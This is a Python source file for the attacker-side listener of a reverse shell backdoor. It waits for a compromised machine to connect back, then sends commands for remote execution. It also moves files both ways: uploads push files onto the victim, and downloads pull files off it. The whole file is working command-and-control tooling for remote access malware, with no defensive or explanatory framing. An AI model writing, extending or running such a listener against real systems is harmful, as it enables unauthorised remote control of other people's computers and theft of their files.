import socket, json, base64, optparse, sys
from json import JSONDecodeError


def get_argument():
    parser = optparse.OptionParser()
    parser.add_option("-i", "--ip", dest="ip", help="Enter the ip of your machine.")
    parser.add_option("-p", "--port", dest="port", help="Enter the port number which you want to listen on.")
    (options, arguments) = parser.parse_args()

    if not options.ip:
        parser.error("Please input ip of the machine, use --help for more info.")
    elif not options.port:
        parser.error("Please input the port number, use --help for more info.")
    return options


class Listener:
    def __init__(self,ip,port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        listener.bind((ip,port))
        listener.listen(0)
        print("[+] Waiting for incoming connection")
        self.connection, address = listener.accept()

        print("[+] Got a connection from " + str(address))

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data += self.connection.recv(1024).decode()
                return json.loads(json_data)
            except JSONDecodeError:
                continue

    def reliable_send(self,data):
        json_data = json.dumps(data).encode()
        self.connection.send(json_data)

    def execute_remotely(self,command):
        self.reliable_send(command)
        if command[0] == "exit":
            self.connection.close()
            sys.exit()
        return self.reliable_receive()

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Download Complete."

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def run(self):
        while True:
            command = input(">> ")
            command = command.split(" ")
            try:
                if command[0] == "upload":
                    content = self.read_file(command[1])
                    command.append(content.decode())
                result = self.execute_remotely(command)
                if command[0]=="download" and "[-] Error" not in result:
                    result = self.write_file(command[1], result.encode())
            except Exception:
                result = "[-] Error during command execution."

            print(result)

options = get_argument()

listen = Listener(options.ip, int(options.port))
listen.run()